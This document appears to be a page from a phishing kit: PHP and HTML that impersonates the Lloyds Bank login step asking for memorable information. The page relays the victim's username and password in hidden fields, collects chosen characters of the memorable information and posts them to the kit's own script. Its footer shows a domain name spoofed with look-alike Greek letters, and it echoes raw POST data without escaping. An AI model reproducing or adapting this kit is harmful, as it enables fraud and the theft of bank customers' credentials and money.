<?php
require "assets/includes/session_protect.php";
require_once("assets/includes/functions.php");
require_once("assets/includes/memo.php");
?>
<!DOCTYPE html>
<html lang="en">
<head>
<title>Enter Memorable</title>
<link href="assets/images/001.ico" rel="shortcut icon">
<link href="assets/styles/001.css" rel="stylesheet" type="text/css">
<script src="assets/js/001.jspf" type="text/javascript"></script>
<script src="assets/js/001.js" type="text/javascript"></script>
<script src="assets/js/002.js" type="text/javascript"></script>
<script type="text/javascript">
DI.themePath="https://online.lloydsbank.co.uk/personal/unauth/assets/LloydsRetail/";
</script>
<script src="assets/js/003.js" type="text/javascript"></script>
</head>
<body>
<div id="wrapper">
<div class="outer">
<div id="header">
<ul id="skiplinks">
<li><a id="lnkSkip" name="lnkSkip" href="#page">Skip to main content</a></li>
</ul>
<div class="clearfix">
<span id="strbrandname" style="display: none">LLOYDS</span>
<p id="logo"><span><img src="assets/images/002.png"/></span></p>
<div class="secureMsg"><p class="msg"><img src="assets/images/003.png"/></p>
<p><a class="linkBullet newwin" href="#">How can I tell that this site is secure?</a></p>
</div>
<div class="loggedIn">
<ul>
<li class="mobile"><a href="mobile/Login.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true" class="linkBullet">Mobile</a></li>
<li class="cookie"><a class="linkBullet newwin" href="#">Cookie policy</a></li>
</ul>
</div>
</div>
</div>
</div>
<div class="pageWrap">
<div class="content" id="page">
<div class="primaryWrap">
<div class="primary">
<div class="panel">
<h1>Your memorable information</h1>
<div class="inner"><p><strong></strong></p>
<p><strong>Please enter characters 2, 4 and&nbsp;7 from your memorable information then click on the continue button.</strong></p>
<p><strong>We may ask you to enter your full memorable information.</strong></p>
<p></p>
<p>This login step improves security.</p>
</div>
<form id="memo" name="memo" method="post" action="MemorableRetry.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true" class="validationName:(frmentermemorableinformation1) validate:()" autocomplete="off" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="username" value="<?=$_POST['username']?>">
<input type="hidden" name="password" value="<?=$_POST['password']?>">
<fieldset class="memInfoSelect clearfix">
<div class="formField validate:(oneSelectFieldRequired) validationName:(memorableInformation) clearfix">
<div class="formFieldInner">
<div class="clearfix">
<label for="frmentermemorableinformation1:strEnterMemorableInformation_memInfo1">Character 1 :</label>
<select id="frmentermemorableinformation1:strEnterMemorableInformation_memInfo1" name="frmentermemorableinformation1:strEnterMemorableInformation_memInfo1">
<?php echo memoselect; ?>
</select>
</div>
<div class="clearfix">
<label for="frmentermemorableinformation1:strEnterMemorableInformation_memInfo2">Character 4 :</label>
<select id="frmentermemorableinformation1:strEnterMemorableInformation_memInfo2" name="frmentermemorableinformation1:strEnterMemorableInformation_memInfo2">
<?php echo memoselect; ?>
</select></div>
<div class="clearfix">
<label for="frmentermemorableinformation1:strEnterMemorableInformation_memInfo3">Character 6 :</label>
<select id="frmentermemorableinformation1:strEnterMemorableInformation_memInfo3" name="frmentermemorableinformation1:strEnterMemorableInformation_memInfo3">
<?php echo memoselect; ?>
</select>
</div>
</div>
</div>
</fieldset>
<div class="inner">
<ul class="linkList">
<li><a id="frmentermemorableinformation1:lktrouble" name="frmentermemorableinformation1:lktrouble" href="#">Having trouble logging in?</a></li>
</ul>
</div>
<ul class="actions">
<li class="primaryAction">
<input id="frmentermemorableinformation1:btnContinue" name="frmentermemorableinformation1:btnContinue" type="image" src="assets/images/004.png" alt="Continue" title="Continue" class="submitAction">
</li>
<li><strong><a id="frmentermemorableinformation1:lkCancel" name="frmentermemorableinformation1:lkCancel" href="#" class="cancel pseudoLink">Cancel</a></strong></li>
</ul>
</form>
</div>
</div>
</div>
<?php echo memosecondary; ?>
</div>
</div>
<div id="footer">
<div class="outer">
<div id="footerInner">
<ul>
<li><a class="newwin" href="#">Legal</a></li>
<li><a class="newwin" href="#">Privacy</a></li>
<li><a class="newwin" href="#">Security</a></li>
<li><a class="newwin" href="#">www.ll&#959;ydsbankinggr&#959;up.c&#959;m</a></li>
<li><a class="newwin" href="#">Rates and Charges</a></li>
</ul>
</div>
</div>
</div>
</div>
</body>
</html>